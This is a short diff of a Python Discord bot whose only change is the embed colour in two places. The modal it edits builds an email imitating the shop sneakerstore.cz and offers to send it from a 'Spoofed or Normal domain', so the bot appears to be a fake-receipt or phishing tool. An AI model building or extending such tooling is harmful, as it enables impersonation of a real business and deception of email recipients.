@@ -68,7 +68,7 @@ class SneakerStoreCZModal2(ui.Modal, title="SneakerStore CZ - Step 2"):
 
             first_data = sneakerstorecz_form_data[owner_id]
 
-            embed = discord.Embed(title="Under Process...", description="Processing your email will be sent soon!", color=0x1e1f22)
+            embed = discord.Embed(title="Under Process...", description="Processing your email will be sent soon!", color=discord.Color.from_str("#826bc2"))
             await interaction.response.edit_message(embed=embed, view=None)
 
             # Calculate total price
@@ -122,7 +122,7 @@ class SneakerStoreCZModal2(ui.Modal, title="SneakerStore CZ - Step 2"):
             owner_id = interaction.user.id
             link = "https://www.sneakerstore.cz/"
 
-            embed = discord.Embed(title="Choose email provider", description="Email is ready to send choose Spoofed or Normal domain.", color=0x1e1f22)
+            embed = discord.Embed(title="Choose email provider", description="Email is ready to send choose Spoofed or Normal domain.", color=discord.Color.from_str("#826bc2"))
             view = choiseView(owner_id, html_content, sender_email, subject, first_data['productname'], self.imagelink.value, link)
             await interaction.edit_original_response(embed=embed, view=view)
 
